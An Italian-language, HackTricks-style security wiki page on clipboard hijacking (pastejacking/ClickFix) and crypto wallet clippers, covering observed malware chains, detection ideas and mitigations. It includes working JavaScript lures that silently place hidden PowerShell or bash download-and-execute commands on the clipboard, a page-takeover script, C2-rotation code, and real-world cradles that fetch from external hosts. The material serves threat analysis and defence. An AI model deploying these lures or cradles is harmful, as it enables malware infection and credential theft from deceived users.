# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Never paste anything you did not copy yourself." – vecchio consiglio ma ancora valido

## Overview

Clipboard hijacking – noto anche come *pastejacking* – sfrutta il fatto che gli utenti copiano e incollano regolarmente comandi senza ispezionarli. Una pagina web malevola (o qualsiasi contesto capace di eseguire JavaScript, come un'applicazione Electron o Desktop) inserisce programmaticamente testo controllato dall'attaccante nella clipboard di sistema. Le vittime vengono incoraggiate, di solito tramite istruzioni di social engineering accuratamente costruite, a premere **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell), oppure aprire un terminale e *incollare* il contenuto della clipboard, eseguendo immediatamente comandi arbitrari.

Poiché **nessun file viene scaricato e nessun allegato viene aperto**, la tecnica bypassa la maggior parte dei controlli di sicurezza su e-mail e contenuti web che monitorano allegati, macro o esecuzione diretta di comandi. L'attacco è quindi popolare nelle campagne di phishing che distribuiscono famiglie di malware commodity come NetSupport RAT, Latrodectus loader o Lumma Stealer.

## Wallet-address replacement clippers

Un'altra variante di **clipboard hijacking** non incolla affatto comandi: attende finché la vittima copia un **indirizzo di wallet di cryptocurrency**, poi lo sostituisce silenziosamente con uno controllato dall'attaccante appena prima dell'incolla. Questo è particolarmente efficace contro formati di wallet lunghi perché gli utenti spesso verificano solo i primi/ultimi caratteri.

Caratteristiche comuni nel mondo reale:
- **Thin loader + nested payload**: l'app/exe visibile sembra uno strumento legittimo di trading o "profit", mentre il vero clipper è nascosto più in profondità nel bundle (ad esempio un loader .NET che avvia un nested payload Rust).
- **Regex-driven replacement**: il malware abbina stringhe come `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...`, o persino stringhe generiche **Solana-like da 44 caratteri** e le riscrive con wallet dell'attaccante.
- **Wallet rotation at scale**: i campioni moderni per Windows possono incorporare **migliaia** di wallet di sostituzione per valuta invece di un singolo indirizzo statico, riducendo il burn di reputazione del wallet dopo ogni furto.

### Windows clipper flow

Un'implementazione comune è una finestra nascosta registrata con **`AddClipboardFormatListener`**. Ad ogni aggiornamento della clipboard, il malware in genere chiama:
- **`OpenClipboard`** → accesso ai dati correnti della clipboard.
- **`GetClipboardData`** → lettura del testo.
- **`EmptyClipboard`** + **`SetClipboardData`** → sostituzione della stringa del wallet con il valore dell'attaccante.

Minimal hunting regexes frequently seen in clippers:
```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```
La persistenza a livello utente è sufficiente per l’impatto. Un pattern osservato è:
- Copiare il payload in **`%APPDATA%\silke\silke.exe`**
- Creare un **LNK della cartella Startup** sotto `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\`

Idee di detection:
- Processi che chiamano in modo continuo le API della clipboard mentre scrivono anche sotto `%APPDATA%` e la cartella **Startup** dell’utente.
- Nuova creazione di LNK/executable seguita da riscritture della clipboard dell’indirizzo wallet.
- Archivi o bundle di finto software contenenti molti file inutilizzati più un piccolo launcher che avvia un binary annidato.

### macOS rimozione social-engineered della quarantine + persistenza LaunchAgent

Su macOS, alcune campagne distribuiscono un helper **`unlocker.command`** e istruiscono la vittima a fare clic destro → **Open** se Gatekeeper dice che l’app è danneggiata o proviene da uno sviluppatore non identificato. Lo script semplicemente rimuove la quarantine e avvia la `.app` vicina:
```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```
This is **not** a Gatekeeper exploit; it is a **social-engineered quarantine bypass** that abuses the fact that Gatekeeper decisions depend on the `com.apple.quarantine` xattr.

After execution, the clipper can persist as the current user by writing:
- **`~/launch.sh`** – wrapper script
- **`~/Library/LaunchAgents/com.example..plist`** – LaunchAgent with `RunAtLoad` and `KeepAlive`

A useful defensive detail is that some samples implement a **self-healing watchdog** that re-writes the LaunchAgent and wrapper every ~30 seconds. If you remove the plist first **without killing the running process**, the malware may recreate it immediately. Safe cleanup order:
1. Kill the active clipper process.
2. Unload/delete the LaunchAgent plist.
3. Delete `~/launch.sh` and the copied payload.

### Delivery note: fake reputation as a force multiplier

For this family, the malware itself can stay technically simple while the **distribution layer** does the heavy lifting: fake GitHub stars/forks, SourceForge reviews/downloads, YouTube tutorial comments/views, and benign-looking VirusTotal comments/votes are used to make the binary appear trustworthy before execution.

## Forced copy buttons and hidden payloads (macOS one-liners)

Some macOS infostealers clone installer sites (e.g., Homebrew) and **force use of a “Copy” button** so users cannot highlight only the visible text. The clipboard entry contains the expected installer command plus an appended Base64 payload (e.g., `...; echo <b64> | base64 -d | sh`), so a single paste executes both while the UI hides the extra stage.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Le campagne precedenti usavano `document.execCommand('copy')`, quelle più recenti si affidano alla **Clipboard API** asincrona (`navigator.clipboard.writeText`).

## The ClickFix / ClearFake Flow

1. L'utente visita un sito typosquatted o compromesso (ad es. `docusign.sa[.]com`)
2. Il JavaScript iniettato **ClearFake** richiama un helper `unsecuredCopyToClipboard()` che memorizza silenziosamente negli appunti una one-liner PowerShell codificata in Base64.
3. Le istruzioni HTML dicono alla vittima di: *“Premi **Win + R**, incolla il comando e premi Invio per risolvere il problema.”*
4. `powershell.exe` viene eseguito, scaricando un archivio che contiene un eseguibile legittimo più una DLL malevola (classico DLL sideloading).
5. Il loader decifra fasi aggiuntive, inietta shellcode e installa persistenza (ad es. scheduled task) – eseguendo infine NetSupport RAT / Latrodectus / Lumma Stealer.

### Example NetSupport RAT Chain
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (Java WebStart legittimo) cerca nella sua directory `msvcp140.dll`.
* La DLL malevola risolve dinamicamente le API con **GetProcAddress**, scarica due binari (`data_3.bin`, `data_4.bin`) tramite **curl.exe**, li decripta usando una chiave XOR a rotazione `"https://google.com/"`, inietta lo shellcode finale e decomprime **client32.exe** (NetSupport RAT) in `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Scarica `la.txt` con **curl.exe**
2. Esegue il downloader JScript dentro **cscript.exe**
3. Recupera un payload MSI → rilascia `libcef.dll` accanto a un'applicazione firmata → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer via MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
Il richiamo **mshta** avvia uno script PowerShell nascosto che recupera `PartyContinued.exe`, estrae `Boat.pst` (CAB), ricostruisce `AutoIt3.exe` tramite `extrac32` e concatenazione di file e infine esegue uno script `.a3x` che esfiltra le credenziali del browser verso `sumeriavgv.digital`.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Alcune campagne ClickFix saltano del tutto i download di file e istruiscono le vittime a incollare una one-liner che recupera ed esegue JavaScript tramite WSH, lo rende persistente e ruota il C2 ogni giorno. Catena osservata di esempio:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Caratteristiche principali
- URL offuscato invertito in runtime per aggirare un’ispezione superficiale.
- JavaScript persiste tramite un LNK di Startup (WScript/CScript) e seleziona il C2 in base al giorno corrente, consentendo una rapida rotazione dei domain.

Frammento JS minimale usato per ruotare i C2 in base alla data:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
La fase successiva di solito distribuisce un loader che stabilisce la persistenza e scarica un RAT (ad es. PureHVNC), spesso applicando TLS pinning a un certificato hardcoded e suddividendo il traffico in chunk.

Idee di detection specifiche per questa variante
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (o `cscript.exe`).
- Startup artifacts: LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` che invoca WScript/CScript con un path JS sotto `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU e telemetry della command line che contengono `.split('').reverse().join('')` o `eval(a.responseText)`.
- Ripetuti `powershell -NoProfile -NonInteractive -Command -` con payload stdin grandi per alimentare script lunghi senza command line lunghe.
- Scheduled Tasks che in seguito eseguono LOLBins come `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` sotto un task/path che sembra un updater (ad es. `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Hostname e URL C2 che ruotano ogni giorno con pattern `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Correlare eventi di scrittura della clipboard seguiti da paste con Win+R e poi esecuzione immediata di `powershell.exe`.


I Blue-teams possono combinare telemetry di clipboard, creazione processi e registry per individuare l’abuso di pastejacking:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` conserva una cronologia dei comandi di **Win + R** – cerca voci insolite in Base64 / offuscate.
* Security Event ID **4688** (Process Creation) dove `ParentImage` == `explorer.exe` e `NewProcessName` in { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** per la creazione di file sotto `%LocalAppData%\Microsoft\Windows\WinX\` o cartelle temporanee subito prima del sospetto evento 4688.
* Sensori EDR per la clipboard (se presenti) – correlare `Clipboard Write` seguito immediatamente da un nuovo processo PowerShell.

## Pagine di verifica in stile IUAM (ClickFix Generator): copia negli appunti-consolle + payload aware dell'OS

Campagne recenti producono in massa false pagine di verifica CDN/browser ("Just a moment…", stile IUAM) che inducono gli utenti a copiare comandi specifici per l’OS dalla clipboard nelle console native. Questo sposta l’esecuzione fuori dalla sandbox del browser e funziona sia su Windows sia su macOS.

Caratteristiche chiave delle pagine generate dal builder
- Rilevamento OS tramite `navigator.userAgent` per adattare i payload (Windows PowerShell/CMD vs. macOS Terminal). Decoy/opzioni no-op per OS non supportati per mantenere l’illusione.
- Copia automatica negli appunti su azioni UI benigne (checkbox/Copy) mentre il testo visibile può differire dal contenuto della clipboard.
- Blocco mobile e un popover con istruzioni passo-passo: Windows → Win+R→paste→Enter; macOS → apri Terminal→paste→Enter.
- Offuscamento opzionale e injector single-file per sovrascrivere il DOM di un sito compromesso con una UI di verifica in stile Tailwind (non è richiesta la registrazione di un nuovo dominio).

Esempio: mismatch della clipboard + branching aware dell'OS
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
Persistenza di macOS della prima esecuzione
- Usa `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` in modo che l'esecuzione continui dopo la chiusura del terminale, riducendo gli artefatti visibili.

Presa di controllo della pagina in loco su siti compromessi
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
- Idee di detection & hunting specifiche per lures in stile IUAM
- Web: pagine che associano la Clipboard API a widget di verifica; mismatch tra il testo mostrato e il payload negli appunti; branching `navigator.userAgent`; Tailwind + replace single-page in contesti sospetti.
- Endpoint Windows: `explorer.exe` → `powershell.exe`/`cmd.exe` poco dopo un’interazione con il browser; installer batch/MSI eseguiti da `%TEMP%`.
- Endpoint macOS: Terminal/iTerm che avviano `bash`/`curl`/`base64 -d` con `nohup` vicino a eventi del browser; job in background che sopravvivono alla chiusura del terminale.
- Correlare la cronologia `RunMRU` di Win+R e le scritture negli appunti con la successiva creazione di processi da console.

Vedi anche per tecniche di supporto

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## Evoluzioni 2026 fake CAPTCHA / ClickFix (ClearFake, Scarlet Goldfinch)

- ClearFake continua a compromettere siti WordPress e a iniettare JavaScript loader che concatenano host esterni (Cloudflare Workers, GitHub/jsDelivr) e persino chiamate blockchain “etherhiding” (ad es. `POST` verso endpoint API di Binance Smart Chain come `bsc-testnet.drpc[.]org`) per recuperare la logica corrente del lure. Le overlay recenti usano pesantemente fake CAPTCHA che istruiscono gli utenti a copiare/incollare una one-liner (T1204.004) invece di scaricare qualcosa.
- L’esecuzione iniziale è sempre più delegata a signed script hosts/LOLBAS. A gennaio 2026 le catene hanno sostituito il precedente uso di `mshta` con il `SyncAppvPublishingServer.vbs` built-in eseguito tramite `WScript.exe`, passando argomenti in stile PowerShell con alias/wildcard per recuperare contenuto remoto:
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` è firmato e normalmente usato da App-V; insieme a `WScript.exe` e parametri insoliti (`gal`/`gcm` aliases, cmdlet con wildcard, URL jsDelivr) diventa uno stage LOLBAS ad alta affidabilità per ClearFake.
- I payload fake CAPTCHA di febbraio 2026 sono tornati a puri download cradles in PowerShell. Due esempi live:
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- La prima chain è un grabber in-memory `iex(irm ...)`; la seconda fa staging tramite `WinHttp.WinHttpRequest.5.1`, scrive un `.ps1` temporaneo, poi lo avvia con `-ep bypass` in una finestra nascosta.

Detection/hunting tips for these variants
- Process lineage: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` o cradle PowerShell subito dopo scritture negli appunti/Win+R.
- Command-line keywords: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, domini jsDelivr/GitHub/Cloudflare Worker, o pattern `iex(irm ...)` con raw IP.
- Network: outbound verso host CDN worker o endpoint blockchain RPC da script hosts/PowerShell subito dopo la navigazione web.
- File/registry: creazione temporanea di `.ps1` sotto `%TEMP%` più voci RunMRU contenenti questi one-liner; block/alert su LOLBAS firmati script (WScript/cscript/mshta) eseguiti con URL esterni o stringhe alias offuscate.

## June 2026 ClickFix tradecraft: paste telemetry, fake verification comments, and LOLBin chaining

Recent Red Canary telemetry shows that the stable indicator is **not one exact command**, but the combination of **user-assisted paste-and-run**, **trusted interpreters/LOLBins**, **obfuscated flags**, **remote retrieval**, and **immediate execution**.

### Notable operator patterns

- **Paste confirmation telemetry**: some payloads call `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` before the real stage. This confirms user interaction while keeping the window short and quiet.
- **Fake verification comments**: PowerShell one-liners may append strings such as `# Security check ✔️ I'm not a robot Verification ID: 138105` so the command still looks CAPTCHA-related after it is pasted into Run / `cmd.exe` / PowerShell history.
- **Dynamic URL reconstruction**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` avoids a static URL in the command line while still performing in-memory download-and-execute.
- **Masqueraded installer execution**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` abuses unusual casing and Unicode-like characters in flags to break brittle detections while still resembling `msiexec.exe`.
- **Caret-escaped LOLBin chains**: `cmd.exe` can hide keywords with `^` escapes (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`), start the nested shell minimized, save attacker content with a benign extension such as `.pdf`, and then execute it through `mshta`.
## Mitigations

1. Browser hardening – disable clipboard write-access (`dom.events.asyncClipboard.clipboardItem` etc.) or require user gesture.
2. Security awareness – teach users to *type* sensitive commands or paste them into a text editor first.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control to block arbitrary one-liners.
4. Network controls – block outbound requests to known pastejacking and malware C2 domains.

## Related Tricks

* **Discord Invite Hijacking** often abuses the same ClickFix approach after luring users into a malicious server:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [Red Canary – Intelligence Insights: June 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [Check Point Research – From Stars to Upvotes: Fake Reputation Fueling a Crypto Clipboard Hijacker](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)

{{#include ../../banners/hacktricks-training.md}}
